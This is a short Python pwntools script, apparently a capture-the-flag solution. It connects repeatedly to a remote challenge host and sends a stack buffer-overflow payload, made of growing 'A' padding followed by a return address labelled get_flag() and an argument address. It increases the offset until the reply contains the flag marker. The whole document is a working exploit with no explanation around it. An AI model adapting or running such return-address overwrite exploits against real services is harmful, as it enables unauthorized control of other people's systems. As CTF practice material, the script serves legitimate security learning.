from pwn import *

i=0x44
while True:
    r = remote("jh2i.com",50039)
    p = "A"*i
    p += p32(0x080484f6)# get_flag() function
    p += "asdf"
    p += p32(0x08048720)
    r.sendline(p)
    data = r.recvall()
    print data
    if "LLS" in data:
        print data
        break
    i += 1
